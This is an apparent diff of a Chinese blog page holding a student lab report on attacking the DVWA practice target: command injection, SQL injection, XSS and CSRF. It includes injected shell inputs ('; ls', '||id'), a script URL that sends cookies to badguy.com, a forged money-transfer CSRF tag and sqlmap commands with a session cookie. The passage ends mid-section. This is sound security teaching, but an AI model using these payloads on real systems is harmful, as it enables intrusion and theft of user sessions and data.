@@ -17,12 +17,53 @@
 <meta property="og:site_name" content="ccy的博客">
 <meta property="og:description" content="一、实验目的 理解web应用工作原理 理解常见web漏洞原理，包括：XSS 跨站脚本、CSRF 跨站请求、命令注入、 SQL 注入等 掌握常用的渗透测试工具，如：OWASP ZAP(或者 Burp suite)、SQLMAP 等 掌握命令注入、SQL 注入、XSS、CSRF 等漏洞利用方式  二、实验内容 配置 Web 攻防实验环境 针对靶机 DVWA，进行命令注入、SQL 注入、XSS、CSRF">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202832811.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202910103.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202930799.png">
+<meta property="og:image" content="http://example.com/%22http:/mybank.com/moneyxfer.cgi?Account=alice&amt=500000&to=DrEvil%22">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211201912404.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211201823753.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211200539075.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211202122914.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211203718004.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211204003201.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211193923905.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211195500113.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211204333760.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211204511354.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212145818723.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212145651619.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212145504813.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212204158914.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212210940332.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212211435853.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212211614880.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212211954605.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216154607894.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216155405747.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216160531884.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216164905350.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216165333656.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216165559480.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216165929296.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216170022089.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216171632158.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216172017547.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216171944644.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216172331732.png">
+<meta property="og:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216172500534.png">
 <meta property="article:published_time" content="2022-12-08T06:41:10.000Z">
-<meta property="article:modified_time" content="2022-12-11T09:04:11.940Z">
+<meta property="article:modified_time" content="2022-12-19T10:08:40.646Z">
 <meta property="article:author" content="ccy">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="web安全">
+<meta property="article:tag" content="DVWA">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="命令注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202832811.png">
   
     <link rel="alternative" href="/atom.xml" title="ccy的博客" type="application/atom+xml">
   
@@ -215,7 +256,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">314字</span>
+      <span class="post-count">4.4k字</span>
     </span>
   </span>
 
@@ -224,7 +265,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">17分</span>
     </span>
   </span>
 </div>
@@ -237,6 +278,11 @@
     
       <!-- Table of Contents -->
     
+      <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">一、实验目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-number">2.</span> <span class="toc-text">二、实验内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">三、实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-XSS%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 XSS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">四、实验过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 命令注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 SQL注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 CSRF攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 存储型XSS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 反射型XSS攻击</span></a></li></ol></li></ol>
+      </div>
+    
     <h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
 <li>理解web应用工作原理</li>
 <li>理解常见web漏洞原理，包括：XSS 跨站脚本、CSRF 跨站请求、命令注入、 SQL 注入等</li>
@@ -247,10 +293,186 @@
 <li>配置 Web 攻防实验环境</li>
 <li>针对靶机 DVWA，进行命令注入、SQL 注入、XSS、CSRF 攻击，安全级别主要包括 low level 和 medium level。</li>
 </ol>
-<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><h2 id="四、实验过程"><a href="#四、实验过程" class="headerlink" title="四、实验过程"></a>四、实验过程</h2><h3 id="4-1-环境搭建"><a href="#4-1-环境搭建" class="headerlink" title="4.1 环境搭建"></a>4.1 环境搭建</h3><p>​		下载 OWASPBWA 虚拟机镜像，导入 vmware。 网址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/owaspbwa/files/latest/download">https://sourceforge.net/projects/owaspbwa/files/latest/download</a>.</p>
-<p>​		靶机的网络设置请避免使用桥架模式。 如果从宿主机进行靶机渗透，则需要确保宿主机和靶机的网络连接正确。也可以从另一台虚拟机发起渗透测试，同时也需要事先确保网络配置正确。</p>
-<p>​		通过浏览器访问靶机的 IP 地址，然后从页面选择 DVWA，进入 DVWA 应用。也可以直接访问 URL：<a target="_blank" rel="noopener" href="http://192.168.44.131/dvwa/login.php%E3%80%82%E6%B3%A8%E6%84%8F%E6%9B%BF%E6%8D%A2%E4%B8%BA%E4%B8%AA%E4%BA%BA%E7%8E%AF%E5%A2%83%E7%9A%84">http://192.168.44.131/dvwa/login.php。注意替换为个人环境的</a> IP 地 址。登录到 DVWA，用户名：admin；口令：admin。</p>
-<h3 id="4-2-命令注入攻击"><a href="#4-2-命令注入攻击" class="headerlink" title="4.2 命令注入攻击"></a>4.2 命令注入攻击</h3>
+<span id="more"></span>
+
+<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><p>​		由于 web 应用的流行，web 应用成为攻击者的重点目标之一。OWASP 会定期推出排名前十的 web 应用漏洞，其中最常见的针对 web 漏洞的攻击包括：命令注入、SQL 注 入、XSS 攻击和 CSRF 攻击。实验中，将对上述漏洞进行验证。</p>
+<h3 id="3-1-命令注入"><a href="#3-1-命令注入" class="headerlink" title="3.1 命令注入"></a>3.1 命令注入</h3><p>​		某些 web 应用中，web 后端会运行特定的命令并把输出结果通过 web 前端展示给用户。比如后端调用 ping 192.168.56.100 命令，展示能否 ping 通指定 IP 地址，而用户输入的是 IP 地址。如果后端没有对用户输入数据进行检查（过滤），则用户可能注入命令并获得执行结果。例如：192.168.56.100; ls; who  会导致后面的 ls 和 who 命令被执行。而实际的注入形式可能由多种，比如用||连接命令，用&amp;&amp;连接命令等。具体实施时，还需要考虑目标平台的属性，比如 linux 操作系 统和 windows 操作系统在后台执行多个命令是由区别的，因此需要考虑具体情况来实施命令注入。</p>
+<h3 id="3-2-SQL注入"><a href="#3-2-SQL注入" class="headerlink" title="3.2 SQL注入"></a>3.2 SQL注入</h3><p>​		与命令注入类似，SQL 注入也是由于 web 后端对用户输入处理不严格导致的。正常情况下，用户输入不应该作为 SQL 命令执行，但是由于如果后端没有对对这种要求进行检查，攻击者就可以输入 SQL 命令，并在数据库管理系统运行特定的 SQL 语句，导致恶意操作被实施。 </p>
+<p>Web 应用开发者的本意是用户应该在如下空格处填入内容：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202832811.png" alt="image-20221216202832811" style="zoom:50%;"> 
+
+<p>但是，如果用户在 eid 处输入 EID5002’#，而在 password 处输入任意的字符串呢？</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202910103.png" alt="image-20221216202910103" style="zoom:50%;"> 
+
+<p>#后面的文本都将会作为注释而被忽略掉，最终的 SQL 语句如下：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216202930799.png" alt="image-20221216202930799" style="zoom:50%;"> 
+
+<p>上述语句将返回 eid&#x3D;’EID5002’用户的 Name、Salary、SSN 信息，而无需知道该 eid 对应的口令。</p>
+<h3 id="3-3-XSS攻击"><a href="#3-3-XSS攻击" class="headerlink" title="3.3 XSS攻击"></a>3.3 XSS攻击</h3><p>​		跨站脚本攻击(Cross Site Scripting)中，攻击者利用 web 应用对用户输入检测不严格的弱点，注入恶意 JS 脚本。当用户请求涉及恶意脚本的 URL 时，恶意脚本会在用户的浏览器运行，造成用户的 cookie 被窃取等网络安全问题。XSS 通常包括：反射型 XSS， 存储型 XSS 和 DOM 型 XSS。</p>
+<p>​		反射型：一些网页设计的功能中，用户的输入会被反射(echo)返回给用户的 HTML 网页中。如果 web 后端不对用户的输入进行检查，则可能导致输入的脚本被反射给用户浏览器运行。如果包含的脚本是恶意的，则可能造成损失。例如：攻击者在 evil.com 构造如下 URL：<code>http:/victim.com/search.php?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code>，如果用户点击该链接，或者访问包含该连接的网页，则用户浏览器发起对上述 URL 的请求，浏览器将运行其中的脚本，且符合 SOP 要求，因此会造成恶意攻击。</p>
+<p>​		存储型：又称为持久型XSS，攻击者通过web页面注入恶意脚本，服务器对用户输入不做处理（比如检查是否包含script标签等），将用户输入存储到数据库。普通用户访问mybank网站，服务器响应请求，响应内容中包含了从数据库提取的恶意脚本（攻击者注入的）。用户的浏览器解析收到到HTML文档，运行其中嵌入的恶意脚本，则攻击被执行。因为发起的URL请求包含了有效的cookie，因此 mybank 会认为是合法的请求。结果会导致用户的机密信息，如cookie被窃取，从而攻击者可以扮演受害者发起对 mybank 的操作。存储型 XSS 的基本流程可以归纳为：</p>
+<ol>
+<li>攻击者注入恶意脚本。</li>
+<li>服务器对用户输入不做处理（比如检查是否包含script标签等），将用户输入存储到数据库。</li>
+<li>普通用户访问mybank网站。</li>
+<li>服务器响应请求,响应内容中包含了从数据库提取的恶意脚本（攻击者注入的）。</li>
+<li>浏览器解析收到到HTML文档，运行其中嵌入的恶意脚本。</li>
+<li>发起攻击行为，因为发起的URL请求包含了有效的cookie，因此mybank会认为是合法的请求。</li>
+<li>或者盗取用户的机密信息，如cookie，从而攻击者可以扮演受害者发起对mybank的操作。</li>
+</ol>
+<h3 id="3-4-CSRF攻击"><a href="#3-4-CSRF攻击" class="headerlink" title="3.4 CSRF攻击"></a>3.4 CSRF攻击</h3><p>​		cookie 本质上是服务端生成的，存放在客户端的数据片段，广泛用于跟踪已经认证过的用户。例如，用户通过浏览器发起如下请求： <a target="_blank" rel="noopener" href="http://mybank.com/login.html?user=alice&amp;pass=bigsecret">http://mybank.com/login.html?user=alice&amp;pass=bigsecret</a>  如果用户通过身份认证，服务端则生成一个 cookie 来关联到当前用户。后续，服务端可用通过客户端请求所携带的 cookie 来确定当前是否在与对应的客户进行数据交互。 如果攻击者能够利用这种 cookie 认证机制，则可用扮演对应用户的身份。 如果用户浏览过 <a target="_blank" rel="noopener" href="http://xyz.com/">http://xyz.com</a> 网站，则会在本地存储对应的 cookie。然后用户又访问了另一个网站的如下页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">    	<span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Evil!<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">BODY</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">H1</span>&gt;</span>Test Page<span class="tag">&lt;/<span class="name">H1</span>&gt;</span> <span class="comment">&lt;!-- haha! --&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">P</span>&gt;</span> This is a test!<span class="tag">&lt;/<span class="name">P</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;http://xyz.com/do=thing.php...&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>​		那么访问此网页则会触发浏览器去提取 <a target="_blank" rel="noopener" href="http://xyz.com/">http://xyz.com</a> 的数据，且会带上之前存储的 cookie，server 端会以此 cookie 来验证用户的身份，从而可能会在用户不知情的情况下执行某些恶意操作。</p>
+<p>​		如果将上述图片的网址替换为其它网址，也是可以的！比如嵌入的 URL 为：<a target="_blank" rel="noopener" href="http://xyz.com/moneyxfer.cgi?account=alice&amp;amt=50&amp;to=bob%EF%BC%8C%E7%9B%AE%E7%9A%84%E6%98%AF%E8%AE%A9%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E7%9C%8B%E4%BC%BC%E6%AD%A3%E5%B8%B8%E7%9A%84%E9%93%BE%E6%8E%A5%EF%BC%8C%E6%AF%94%E5%A6%82%E5%B9%B3%E5%B8%B8%E8%AE%BF%E9%97%AE%E8%BF%87%E7%9A%84%E7%BD%91%E9%A1%B5%EF%BC%8C%E4%BD%86%E6%98%AF%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%B5%8C%E5%85%A5%E4%BA%86%E4%BC%AA%E9%80%A0%E7%9A%84">http://xyz.com/moneyxfer.cgi?account=alice&amp;amt=50&amp;to=bob，目的是让用户点击看似正常的链接，比如平常访问过的网页，但是网页中嵌入了伪造的</a> URL 请求，导致用户在不知情的情况下执行了对前面访问过的站点的请求。</p>
+<p>​		CSRF 攻击的步骤通常包括：</p>
+<ol>
+<li>用户访问 mybank.com 网站，进行身份认证完成登录，服务端响应时，响应头会	带上 set-cookie 要求客户端存储 cookie，以便跟踪用户会话。注意，这个时候， 用户并没有 logout myback.com 网站。</li>
+<li>用户访问 attacker.com 网站，或者是一个普通网站，但是已经被攻击者控制，因 此本质上是一样的。 </li>
+<li>attacker 网站返回恶意网页，里面嵌入了伪造的链接，比如：<img src="/%22http:/mybank.com/moneyxfer.cgi?Account=alice&amt=500000&to=DrEvil%22" alt="img">。 </li>
+<li>用户浏览器在解析恶意网页时，会自动加载嵌入的伪造的对 mybank 网站的请求，同时会带上与伪造请求对应的 cookie。</li>
+<li>mybank 收到请求后，会认为是一个合法的请求，因为有合法的 cookie，因此执行 URL 指定的操作。</li>
+</ol>
+<h2 id="四、实验过程"><a href="#四、实验过程" class="headerlink" title="四、实验过程"></a>四、实验过程</h2><h3 id="4-1-环境搭建"><a href="#4-1-环境搭建" class="headerlink" title="4.1 环境搭建"></a>4.1 环境搭建</h3><p>​		下载 OWASPBWA 虚拟机镜像，导入 vmware。 网址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/owaspbwa/files/latest/download">https://sourceforge.net/projects/owaspbwa/files/latest/download</a>.</p>
+<p>​		靶机的网络设置为<strong>host only</strong>，请避免使用桥架模式。 如果从宿主机进行靶机渗透，则需要确保宿主机和靶机的网络连接正确。也可以从另一台虚拟机发起渗透测试，同时也需要事先确保网络配置正确。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211201912404.png" alt="image-20221211201912404" style="zoom:50%;"> 
+
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211201823753.png" alt="image-20221211201823753" style="zoom:67%;"> 
+
+<p>​		通过浏览器访问靶机的 IP 地址，然后从页面选择 DVWA，进入 DVWA 应用。也可以直接访问 URL：<a target="_blank" rel="noopener" href="http://192.168.139.128/dvwa/login.php%E3%80%82%E6%B3%A8%E6%84%8F%E6%9B%BF%E6%8D%A2%E4%B8%BA%E4%B8%AA%E4%BA%BA%E7%8E%AF%E5%A2%83%E4%B8%8BOWASP%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84">http://192.168.139.128/dvwa/login.php。注意替换为个人环境下OWASP虚拟机的</a> IP 地址。登录到 DVWA，用户名：admin；口令：admin。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211200539075.png" alt="image-20221211200539075" style="zoom:50%;">
+
+<p>​																		  192.168.139.1                               192.168.139.128</p>
+<h3 id="4-2-命令注入攻击"><a href="#4-2-命令注入攻击" class="headerlink" title="4.2 命令注入攻击"></a>4.2 命令注入攻击</h3><p>侧边栏选择 Command Exection。 在输入框输入要 ping 的目的 IP 地址，如主机：192.168.139.1，结果如下：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211202122914.png" alt="image-20221211202122914" style="zoom:50%;"> 
+
+<p>为什么ping不通呢？</p>
+<p>这里建议了解一下<a href>Linux虚拟机的几种网络连接方式</a></p>
+<p>解决方式1：控制面板——&gt;Windows防火墙——&gt;点击最上面的”允许应用或功能通过xxxxx”——&gt;勾上上图的“文件和打印机共享” </p>
+<p>这样就可以ping通了！</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211203718004.png" alt="image-20221211203718004" style="zoom:50%;">	
+
+<p>这里我们还恢复到以前的设置继续实验。</p>
+<p>侧边栏选择 Command Exection，注入命令，输入数据：<code>192.168.139.1; ls</code></p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211204003201.png" alt="image-20221211204003201" style="zoom:50%;"> 
+
+<p>分析存在命令注入的原因。</p>
+<p>点击下面的 View Source，可以查看源代码，源代码如下：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211193923905.png" alt="image-20221211193923905" style="zoom: 67%;"> 
+
+<p>OWASP靶机是Linux操作系统，点击submit之后，OWASP首先将ip值赋给target，针对非Windows操作系统，执行else内的语句，组合为<code>ping -c 3 192.168.139.1;ls</code>语句之后，由shell执行：对ping命令回应3次，ping失败；之后执行ls命令，显示当前目录下的文件。</p>
+<p>提升 DVWA 的安全等级，在侧边栏选择 DVWA security，然后选择 medium 并提交，然后重新回到 command execution。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211195500113.png" alt="image-20221211195500113" style="zoom: 50%;"> 
+
+<p>再次测试前面成功运行的命令注入，然而，由于提高了安全等价， 系统采用了一定的防御措施，前述的命令注入方法失败。点击右下角的 View source 打开源代码，尝试分析源代码，看看是否有可以利用的漏洞。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211204333760.png" alt="image-20221211204333760" style="zoom:67%;"> 
+
+<p>可以看到，上次命令注入失败的原因，是使用了substitutions针对 ‘&amp;&amp;’ 和 ‘;’ 进行了替换，全部替换为了空，所以上述命令注入失效，但是很显然，这并没有考虑到所有的情况，输入<code>192.168.139.1||id</code></p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221211204511354.png" alt="image-20221211204511354" style="zoom:50%;"> 
+
+<p>; 分隔多个命令，执行效果等同于多个独立的命令单独执行 。</p>
+<p>&amp;&amp;分隔多个命令，只有左边命令成功运行（返回值为 0），才执行右边的命令。</p>
+<p>||分隔多个命令，只有左边命令没有成功运行（返回值为1），才执行右边的命令。</p>
+<h3 id="4-3-SQL注入攻击"><a href="#4-3-SQL注入攻击" class="headerlink" title="4.3 SQL注入攻击"></a>4.3 SQL注入攻击</h3><blockquote>
+<p>之后的实验我们要用到OWASP ZAP，首先介绍一下这个工具：</p>
+<p>OWASP Zed攻击代理（ZAP）是世界上最受欢迎的免费安全审计工具之一，由数百名国际志愿者积极维护。它可以帮助您在开发和测试应用程序时自动查找Web应用程序中的安全漏洞。类似的针对Web应用程序的扫描工具还有AWVS、APPSCAN等。</p>
+<p>也可以说：ZAP是一个中间人代理。它允许您查看您对<strong>Web应用程序发出的所有请求以及您从中收到的所有响应</strong>。</p>
+<p>即可以用于安全专家、开发人员、功能测试人员，甚至是渗透测试入门人员。它也是经验丰富的测试人员用于手动安全测试的绝佳工具。</p>
+<p>主要拥有以下重要功能：</p>
+<ul>
+<li>本地代理</li>
+<li>主动扫描</li>
+<li>被动扫描</li>
+<li>Fuzzy</li>
+<li>暴力破解</li>
+</ul>
+<p>OWAPS ZAP的下载和安装就不过多介绍了，唯一要注意的是下载合适版本的ZAP，不同版本对jdk版本的兼容要求不同，我已经安装了jdk8，为了版本兼容性，这里安装使用的是OWASP ZAP2.9.0。</p>
+</blockquote>
+<p>我们使用火狐浏览器手动配置代理，使火狐浏览器的所有网络流量通过OWASP ZAP这个中间件，以便进行抓包分析。</p>
+<p>首先查看OWASP ZAP的本地代理要求：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212145818723.png" alt="image-20221212145818723" style="zoom:67%;"> 
+
+<p>可以看到，我们需要将火狐浏览器的http代理和https代理设置为127.0.0.1端口为8080。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212145651619.png" alt="image-20221212145651619" style="zoom:50%;"> 
+
+<p>代理设置完成后，接下来进行实验：</p>
+<p>进入DVWA（low security 环境），选择SQL  injectiong，在User ID输入框输入任意内容（比如：123），提交。然后通过ZAP可以查看请求的URL：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit">http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit</a></p>
+<p>以及cookie</p>
+<p>Cookie: security&#x3D;low; PHPSESSID&#x3D;a1853oqe1rl5359v13qfs0na93</p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212145504813.png" alt="image-20221212145504813"></p>
+<blockquote>
+<p>接下来的实验需要用到sqlmap，同样我们先来了解一下什么是sqlmap：</p>
+<p>Sqlmap是一款开源的渗透测试工具，用于自动化检测和利用数据库服务器的sql注入漏洞。</p>
+<p>sqlmap的安装这里也不赘述，跟着网上的教程即可。</p>
+<p>对于sqlmap常用命令和选项的使用，详情见<a target="_blank" rel="noopener" href="https://blog.csdn.net/songbai220/article/details/109303110">sqlmap使用教程</a></p>
+</blockquote>
+<p>在攻击机里的sqlmap中输入并运行如下命令：<code>python sqlmap.py -u &quot;http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=a1853oqe1rl5359v13qfs0na93&quot; --batch</code></p>
+<p>输出结果的最后一部分如下：</p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212204158914.png" alt="image-20221212204158914"></p>
+<p>可以看到成功注入的类型。</p>
+<p>继续查看数据库：<code>python sqlmap.py -u &quot;http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=a1853oqe1rl5359v13qfs0na93&quot; --batch -dbs</code></p>
